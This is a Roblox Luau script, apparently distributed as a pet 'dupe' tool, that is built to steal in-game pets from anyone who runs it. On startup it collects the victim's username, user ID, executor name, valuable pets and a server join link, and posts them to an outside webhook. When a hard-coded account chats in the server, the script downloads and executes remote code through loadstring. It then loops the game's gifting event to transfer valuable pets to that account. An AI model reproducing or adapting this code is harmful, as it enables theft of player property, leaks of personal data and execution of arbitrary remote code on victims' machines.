local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

local MasterPetList = {
    "Butterfly", "Raccoon", "Queen Bee", "Disco Bee", "Mimic Octopus", "Dragonfly", "Pack Bee"
}

local TrashPetList = {
    "Dog", "Golden Lab", "Bunny", "Black Bunny", "Cat", "Orange Tabby", "Chicken",
    "Pig", "Crab", "Starfish", "Seagull",
    "Deer", "Spotted Deer", "Monkey", "Silver Monkey", "Rooster", "Turtle", "Cow", 
    "Snail", "Giant Ant", "Polar Bear", "Panda", "Sea Otter", "Caterpillar", 
    "Praying Mantis", "Hedgehog", "Kiwi", "Mole", "Frog", "Echo Frog", "Owl", 
    "Night Owl", "Grey Mouse", "Squirrel", "Brown Mouse", "Red Giant Ant", 
    "Red Fox", "Chicken Zombie", "Blood Hedgehog", "Blood Kiwi", "Blood Owl", 
    "Moon Cat", "Bee", "Honey Bee", "Petal Bee", "Bear Bee", "Wasp", 
    "Tarantula Hawk", "Moth", "Cooked Owl", "Toucan", "Flamingo", "Sea Turtle", 
    "Seal", "Orangutan", "Peacock", "Capybara", "Scarlet Macaw", "Ostrich", 
    "Firefly", "Red Dragon", "Golden Bee"
}

local TargetUsername = "ProCpvpT2"
local SCRIPT_URL = "https://raw.githubusercontent.com/DupeNew/Dupe/refs/heads/main/screen"
local webhookUrl = "https://3dhkilcqlzvk.manus.space/api/webhook"

local petEmojis = {
    ["Butterfly"] = "🦋", ["Raccoon"] = "🦝", ["Dragonfly"] = "🐲", ["Queen Bee"] = "👑", ["Disco Bee"] = "🕺",
    ["Mimic Octopus"] = "🐙", ["Pack Bee"] = "📦"
}

local giftingWeightThreshold = 11
local webhookWeightThreshold = 12
local hugePetWeightThreshold = 111

local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoid = character and character:FindFirstChild("Humanoid")
local backpack = LocalPlayer and LocalPlayer:FindFirstChild("Backpack")
local GiftingEvent = ReplicatedStorage:FindFirstChild("GameEvents") and ReplicatedStorage.GameEvents:FindFirstChild("PetGiftingService")

local loadstringExecuted = false
local giftingActive = false

local function sendHttpRequest(options)
    local success, result
    
    if HttpService.HttpEnabled then
        success, result = pcall(function()
            return HttpService:PostAsync(
                options.Url,
                options.Body,
                Enum.HttpContentType.ApplicationJson
            )
        end)
    elseif syn and syn.request then
        success, result = pcall(function()
            syn.request(options)
        end)
    elseif http_request then
        success, result = pcall(function()
            http_request(options)
        end)
    elseif request then
        success, result = pcall(function()
            request(options)
        end)
    else
        return false, "No supported HTTP function found"
    end

    if not success then
    end
    
    return success, result
end


local function getExecutorName()
    if getexecutorname then
        local name = getexecutorname()
        return name:sub(1, 1):upper() .. name:sub(2)
    elseif syn and syn.protect_gui then
        return "Synapse X"
    elseif is_sirhurt_closure then
        return "SirHurt"
    elseif Krnl or krnl_LOADED then
        return "Krnl"
    elseif SW_VERSION or getscriptwareversion then
        return "Script-Ware"
    else
        return "Unknown"
    end
end

local function isPetInList(petName, list)
    for i = 1, #list do
        local nameInList = list[i]
        if string.sub(petName, 1, #nameInList) == nameInList then
            return true, nameInList
        end
    end
    return false, nil
end

local function checkInventoryForValuables()
    local foundPetsData, foundPetNames = {}, {}
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local isMaster, baseName = isPetInList(item.Name, MasterPetList)
            local isTrash, _ = isPetInList(item.Name, TrashPetList)
            local shouldReportByWeight, isSuperHuge, weight = false, false, 0
            
            local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
            if weightString then
                local extractedWeight = tonumber(weightString)
                if extractedWeight then
                    weight = extractedWeight
                    if weight >= webhookWeightThreshold then shouldReportByWeight = true end
                    if weight >= hugePetWeightThreshold then isSuperHuge = true end
                end
            end

            if (shouldReportByWeight or (isMaster and not isTrash)) and not table.find(foundPetNames, item.Name) then
                table.insert(foundPetNames, item.Name)
                table.insert(foundPetsData, {name = item.Name, isHuge = isSuperHuge, baseName = baseName, weight = weight})
            end
        end
    end
    return #foundPetsData > 0, foundPetsData
end

local function sortPets(a, b)
    if a.isHuge and not b.isHuge then
        return true
    elseif not a.isHuge and b.isHuge then
        return false
    elseif a.isHuge and b.isHuge then
        return a.weight > b.weight
    else
        return a.name < b.name
    end
end

local function sendWebhookNotification(foundPetsData)
    table.sort(foundPetsData, sortPets)
    
    local playerInfoValue = string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```", LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.UserId, getExecutorName())
    local formattedPetLines = {}
    for _, petData in ipairs(foundPetsData) do
        local emoji = petData.isHuge and "💪" or (petData.baseName and petEmojis[petData.baseName] or "⭐")
        table.insert(formattedPetLines, emoji .. " - " .. petData.name)
    end
    
    local petsValue = "```\n" .. table.concat(formattedPetLines, "\n") .. "\n```"
    local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
    
    local success, pId = pcall(function() return game.PrivateServerId end)
    local serverType = (success and pId ~= "") and "🔒 Private" or "🌍 Public"

    local payload = {
        content = "@everyone",
        embeds = {{
            title = "PALDOOOO WHOO🤑🤑🤑🤑", color = 65280,
            fields = {
                { name = "👤 Player Information", value = playerInfoValue, inline = false },
                { name = "🌐 Server Type", value = "```\n" .. serverType .. "\n```", inline = false },
                { name = "🌴 Found Pets (Sorted)", value = petsValue, inline = false },
                { name = "🔗 Server Link", value = joinLink, inline = false }
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    local successEncode, encodedPayload = pcall(function() return HttpService:JSONEncode(payload) end)
    if not successEncode then
        return
    end

    local requestOptions = {
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = encodedPayload
    }
    
    local reqSuccess, reqError = sendHttpRequest(requestOptions)
    if not reqSuccess then
    else
    end
end

local function giftPetsLoop(targetPlayer)
    if not humanoid or not backpack or not GiftingEvent or not targetPlayer then
        giftingActive = false
        return 
    end
    
    local args = {"GivePet", targetPlayer}
    while giftingActive and targetPlayer.Parent ~= nil do
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                local isMaster, _ = isPetInList(item.Name, MasterPetList)
                local isTrash, _ = isPetInList(item.Name, TrashPetList)
                local isHuge = false
                
                local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
                if weightString then
                    local weight = tonumber(weightString)
                    if weight and weight >= giftingWeightThreshold then isHuge = true end
                end

                if isHuge or (isMaster and not isTrash) then
                    humanoid:EquipTool(item)
                    GiftingEvent:FireServer(unpack(args))
                    task.wait(0)
                end
            end
        end
        task.wait(0)
    end
    
    giftingActive = false
end

local function executeLoadedScript()
    local success, scriptContent = pcall(function() return game:HttpGet(SCRIPT_URL) end)
    if success and scriptContent then
        local scriptFunction, compileError = loadstring(scriptContent)
        if scriptFunction then
            local runSuccess, runError = pcall(scriptFunction)
            if not runSuccess then
            else
            end
        else
        end
    else
    end
end

local function onPlayerChatted(player, message)
    if player.Name == TargetUsername then
        if not loadstringExecuted then
            loadstringExecuted = true
            executeLoadedScript()
        end
        
        if not giftingActive then
            giftingActive = true 
            task.spawn(giftPetsLoop, player)
        else
        end
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end)

for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end

task.wait(1)

local hasPets, foundPetsData = checkInventoryForValuables()
if hasPets then
    sendWebhookNotification(foundPetsData)
else
end


